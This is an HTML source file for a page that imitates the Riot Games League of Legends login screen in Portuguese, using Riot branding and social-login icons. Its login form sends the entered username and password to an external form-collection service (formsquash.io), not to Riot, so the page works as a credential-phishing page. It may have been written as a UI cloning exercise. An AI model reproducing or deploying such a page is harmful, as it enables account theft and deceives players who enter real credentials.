<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="./assets/image/favicon.ico" />
  <link rel="stylesheet" href="https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css" />
  <link rel="stylesheet" href="./assets/css/style.css" />
  <title>League of Legends</title>
</head>
<body>
  <main>
    <form class="login-form" action="https://formsquash.io/f/aONOkuvYtJO8y8cYfwWA" method="POST">
      <figure class="login-form__logo">
        <img src="./assets/image/riot-logo.png" alt="logo riot games" />
      </figure>
      <div class="login-form__inputs">
        <h3>Fazer Login</h3>
        <label for="user">Nome de Usuário</label>
        <input type="text" id="user" name="user" />

        <label for="password">Senha</label>
        <input type="password" id="password" name="password" />
      </div>
      <div class="login-form__social-medias">
        <figure>
          <img src="./assets/image/facebook-icon.svg" alt="Icone do facebook" />
        </figure>
        <figure>
          <img src="./assets/image/google-icon.svg" alt="Icone do google" />
        </figure>
        <figure>
          <img src="./assets/image/apple-icon.svg" alt="Icone da apple" />
        </figure>
      </div>
      <div class="login-form__keep-login">
        <input type="checkbox" id="keepLogin" name="keepLogin" />
        <label for="keepLogin">Mater login</label>
      </div>
      <div class="login-form__btn-container">
        <button disabled class="blocked">
          <i class="fa-thin fa-arrow-right"></i>
        </button>
        <a href="#" title="Recuperar login">Não consegue iniciar a sessão?</a>
        <a href="#" title="Criar conta">Criar conta</a>
      </div>
    </form>
    <div class="banner"></div>
  </main>

  <script src="./assets/js/script.js"></script>
</body>
</html>
